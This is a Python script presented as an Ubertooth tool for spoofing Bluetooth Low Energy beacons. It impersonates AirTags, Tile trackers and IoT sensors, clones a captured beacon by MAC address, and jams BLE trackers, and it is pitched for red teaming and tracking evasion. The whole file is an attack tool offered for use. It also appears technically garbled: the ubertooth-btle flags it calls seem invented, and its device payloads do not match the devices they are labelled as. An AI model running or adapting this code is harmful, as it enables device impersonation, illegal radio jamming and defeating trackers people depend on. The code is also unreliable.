import argparse
import subprocess
import time
import json
import os

"""
Ubertooth BLE Beacon Spoofing Tool

Features:
    - Spoofs BLE beacons to impersonate devices like Apple AirTags, Tile, or IoT sensors.
    - Clones real BLE beacon advertisements to appear as a legitimate device.
    - Customizable advertising intervals & payloads for stealth beacon manipulation.
    - Can be used for red teaming, security research, and BLE tracking evasion.

Requirements:
    - Ubertooth One
    - Install Ubertooth utilities: sudo apt install ubertooth ubertooth-btle
    - Optional: hcitool for additional Bluetooth manipulation.

Usage:
    - Spoof a generic BLE beacon advertisement:
      python ubertooth_beacon_spoof.py --spoof
    - Impersonate an Apple AirTag or Tile Tracker:
      python ubertooth_beacon_spoof.py --device airtag
    - Clone a real BLE beacon from a detected advertisement:
      python ubertooth_beacon_spoof.py --clone AA:BB:CC:DD:EE:FF
    - Customize the beacon payload & advertisement interval:
      python ubertooth_beacon_spoof.py --spoof --interval 500 --payload "0201061AFF4C000215E2C56DB5DFFB48D2B060D0F5A71096E0001"
    - Jam BLE trackers by sending rapid spoofed signals:
      python ubertooth_beacon_spoof.py --jam
"""

LOG_FILE = "beacon_spoof_log.json"

DEVICE_PAYLOADS = {
    "airtag": "0201061AFF4C000215E2C56DB5DFFB48D2B060D0F5A71096E0001",
    "tile": "0201061AFFAAFE000215E2C56DB5DFFB48D2B060D0F5A71096E0002",
    "nordic": "0201060303E000",
    "esp32": "0201060303ABCD",
}

def log_event(event_data):
    """Logs BLE beacon spoofing events."""
    try:
        logs = []
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, "r") as f:
                logs = json.load(f)

        logs.append(event_data)

        with open(LOG_FILE, "w") as f:
            json.dump(logs, f, indent=4)

    except Exception as e:
        print(f"[ERROR] Failed to log beacon spoof event: {e}")

def spoof_beacon(payload, interval):
    """Spoofs a BLE beacon with a specified payload."""
    print(f"[INFO] Spoofing BLE beacon with payload: {payload} at interval {interval}ms")

    try:
        subprocess.run(["ubertooth-btle", "--spoof", payload, "--interval", str(interval)])
        log_event({"timestamp": time.time(), "payload": payload, "action": "BLE Beacon Spoof"})

    except Exception as e:
        print(f"[ERROR] Failed to spoof BLE beacon: {e}")

def clone_beacon(target_mac):
    """Clones a BLE beacon by capturing its advertisement."""
    print(f"[INFO] Cloning BLE beacon from {target_mac}...")

    try:
        output = subprocess.check_output(["ubertooth-btle", "--capture", target_mac])
        captured_payload = output.decode("utf-8").strip()
        print(f"[SUCCESS] Captured beacon payload: {captured_payload}")

        log_event({"timestamp": time.time(), "target": target_mac, "cloned_payload": captured_payload, "action": "Beacon Cloned"})

        spoof_beacon(captured_payload, 500)  # Re-transmit cloned beacon

    except Exception as e:
        print(f"[ERROR] Failed to clone BLE beacon: {e}")

def jam_ble():
    """Jams BLE tracking beacons by flooding the advertisement channels."""
    print("[INFO] Jamming BLE trackers...")

    try:
        subprocess.run(["ubertooth-btle", "--jam"])
        log_event({"timestamp": time.time(), "action": "BLE Jamming"})

    except Exception as e:
        print(f"[ERROR] Failed to jam BLE signals: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Ubertooth BLE Beacon Spoofing Tool")
    parser.add_argument("--spoof", action="store_true", help="Spoof a generic BLE beacon")
    parser.add_argument("--device", type=str, choices=DEVICE_PAYLOADS.keys(), help="Spoof a specific BLE device type (airtag, tile, etc.)")
    parser.add_argument("--clone", type=str, help="Clone a real BLE beacon by MAC address")
    parser.add_argument("--interval", type=int, default=500, help="Set beacon advertisement interval in ms")
    parser.add_argument("--payload", type=str, help="Custom payload for BLE beacon spoofing")
    parser.add_argument("--jam", action="store_true", help="Jam BLE tracking beacons")

    args = parser.parse_args()

    if args.device:
        payload = DEVICE_PAYLOADS.get(args.device, "0201061AFF4C000215E2C56DB5DFFB48D2B060D0F5A71096E0001")
        spoof_beacon(payload, args.interval)
    elif args.clone:
        clone_beacon(args.clone)
    elif args.spoof:
        payload = args.payload if args.payload else "0201061AFF4C000215E2C56DB5DFFB48D2B060D0F5A71096E0001"
        spoof_beacon(payload, args.interval)
    elif args.jam:
        jam_ble()
    else:
        print("[ERROR] No valid mode selected!")
